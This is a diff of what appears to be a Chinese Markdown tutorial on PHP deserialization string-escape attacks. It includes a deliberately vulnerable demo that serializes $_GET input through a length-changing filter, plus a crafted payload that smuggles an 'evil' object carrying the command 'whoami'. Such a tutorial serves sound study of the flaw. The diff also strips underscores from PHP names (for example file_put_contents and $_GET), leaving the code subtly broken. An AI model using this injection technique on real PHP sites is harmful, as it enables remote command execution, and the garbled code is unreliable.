@@ -67,7 +67,6 @@ Classtest{
 
 $r= new test();
 echo serialize($r);
-
 ```
 
 
@@ -76,7 +75,6 @@ echo serialize($r);
 
 ```php
 O:4:"test":3:{s:1:"a";s:1:"1";s:2:"bb";i:2;s:3:"ccc";b:1;}
-
 ```
 
 
@@ -107,7 +105,6 @@ array(2) {
   [1] =>
   string(5) "aaaaa"
 }
-
 ```
 
 
@@ -121,22 +118,21 @@ array(2) {
 
 
 ```php
-_<?php
+<?php
 function filter($string){
     return strreplace('x','yy',$string);
 }
 
 $username = "peri0d";
-$password = "aaaaa";_
+$password = "aaaaa";
 $user = array($username, $password);
 
-$r = filter(serialize($_user));
+$r = filter(serialize($user));
 
 vardump($r);
 echo '\n';
 
-vardump(unserialize($r));_
-
+vardump(unserialize($r));
 ```
 
 
@@ -146,7 +142,6 @@ vardump(unserialize($r));_
 
 ```php
 a:2:{i:0;s:6:"peri0d";i:1;s:5:"aaaaa";}
-
 ```
 
 
@@ -155,7 +150,6 @@ a:2:{i:0;s:6:"peri0d";i:1;s:5:"aaaaa";}
 
 ```php
 a:2:{i:0;s:8:"peri0dyyyy";i:1;s:5:"aaaaa";}
-
 ```
 
 
@@ -233,27 +227,26 @@ class User
 
 function write($data){
     $data = str_replace(chr(0).'*'.chr(0), '\0\0\0', $data);
-    file_put_contents("dbs.txt", $data);
+    fileputcontents("dbs.txt", $data);
 }
 
 function read(){
-    $data = file_get_contents("dbs.txt");
-    $r = str_replace('\0\0\0', chr(0).'*'.chr(0), $_data);
+    $data = filegetcontents("dbs.txt");
+    $r = str_replace('\0\0\0', chr(0).'*'.chr(0), $data);
     return $r;
 }
 
 if(fileexists("dbs.txt")){
     unlink("dbs.txt");  
-}_
+}
 
-$username = $_GET["username"];
+$username = $GET["username"];
 echo $username;
-echo "     ";_
-$password = $_GET["password"];
+echo "     ";
+$password = $GET["password"];
 echo $password;
-write(serialize(new User(_$username, $_password)));
-vardump(unserialize(read()));_
-
+write(serialize(new User($username, $password)));
+vardump(unserialize(read()));
 ```
 
 
@@ -271,7 +264,6 @@ vardump(unserialize(read()));_
 
 ```php
 O:4:"User":2:{s:8:"username";s:4:"test";s:8:"password";s:6:"123456";}
-
 ```
 
 
@@ -295,7 +287,6 @@ O:4:"User":2:{s:8:"username";s:4:"test";s:8:"password";s:6:"123456";}
 
 ```php
 O:4:"User":2:{s:8:"username";s:4:"test";s:8:"password";s:6:"123456";}
-
 ```
 
 
@@ -332,7 +323,6 @@ $password = '1234";'.$payload."}";
 echo $username;
 echo "\n";
 echo $password;
-
 ```
 
 
@@ -347,7 +337,6 @@ db.txt文件中的内容：
 
 ```php
 O:4:"User":2:{s:8:"username";s:54:"\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0";s:8:"password";s:54:"1234";s:2:"ts";O:4:"evil":1:{s:3:"cmd";s:6:"whoami";}}";}
-
 ```
 
 
